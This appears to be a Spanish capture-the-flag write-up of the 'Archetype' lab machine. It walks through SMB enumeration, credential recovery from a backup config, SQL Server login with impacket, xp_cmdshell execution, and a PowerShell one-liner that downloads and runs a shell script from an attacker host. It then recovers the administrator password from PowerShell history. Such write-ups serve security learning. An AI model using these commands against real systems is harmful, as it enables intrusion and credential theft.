# Archetype
## Initial Scan
```
135/tcp   open  msrpc       Microsoft Windows RPC
139/tcp   open  netbios-ssn Microsoft Windows netbios-ssn
1433/tcp  open  ms-sql-s    Microsoft SQL Server 2017 14.00.1000.00; RTM
| ms-sql-ntlm-info: 
|   Target_Name: ARCHETYPE
|   NetBIOS_Domain_Name: ARCHETYPE
|   NetBIOS_Computer_Name: ARCHETYPE
|   DNS_Domain_Name: Archetype
|   DNS_Computer_Name: Archetype
|_  Product_Version: 10.0.17763
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2020-08-26T19:30:28
|_Not valid after:  2050-08-26T19:30:28
|_ssl-date: 2020-08-26T22:10:34+00:00; +15m20s from scanner time.
5985/tcp  open  http        Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http        Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc       Microsoft Windows RPC
49665/tcp open  msrpc       Microsoft Windows RPC
49666/tcp open  msrpc       Microsoft Windows RPC
49667/tcp open  msrpc       Microsoft Windows RPC
49668/tcp open  msrpc       Microsoft Windows RPC
49669/tcp open  msrpc       Microsoft Windows RPC
```
## Enum
### SMB
#### Shares
```
smbclient -N -L 10.10.10.27

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	backups         Disk      
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
```
Accedamos a backups
```
smbclient -N \\\\10.10.10.27\\backups
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Mon Jan 20 13:20:57 2020
  ..                                  D        0  Mon Jan 20 13:20:57 2020
  prod.dtsConfig                     AR      609  Mon Jan 20 13:23:02 2020

		10328063 blocks of size 4096. 8248883 blocks available
smb: \> get prod.dtsConfig
getting file \prod.dtsConfig of size 609 as prod.dtsConfig (1,0 KiloBytes/sec) (average 1,0 KiloBytes/sec)
```
En el archivo tenemoss un par de user:pass
```
Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc
```
### MSS SQL
Para conevtarnos usaremos el mssqlclient.py de la suite impacket
```
mssqlclient.py 'ARCHETYPE/sql_svc:M3g4c0rp123@10.10.10.27' -windows-auth
```
Bien con esto tenemos un RCE ya que el server nos permite ejecutar comandos de CMD 
```
     lcd {path}                 - changes the current local directory to {path}
     exit                       - terminates the server process (and this session)
     enable_xp_cmdshell         - you know what it means
     disable_xp_cmdshell        - you know what it means
     xp_cmdshell {cmd}          - executes cmd using xp_cmdshell
     sp_start_job {cmd}         - executes cmd using the sql server agent (blind)
     ! {cmd}                    - executes a local shell cmd
```
## Exploit
Subimos una shell en el servidor mediante el siguiente comando 
```
xp_cmdshell "powershell "IEX (New-Object Net.WebClient).DownloadString(\"http://10.10.14.20/shell.ps1\");"
```
## Privesc

Podemos acceder al historial de PowerShell
```
type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt 
```
Podemos ver las contraseñas hardcodeadas
```
net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!
```
Con esto solo nos queda logearnos como administrador, usaremos para ello usaremos la utilidad psexec.py de la suite de impacket
# Analísís de la intrusión
### Sensible data leak
Los shares de SMB incluyen archivos con backups de las contraseñas de un usuario para el servicio de MS SQL, lo que nos permitio acceder al sistema
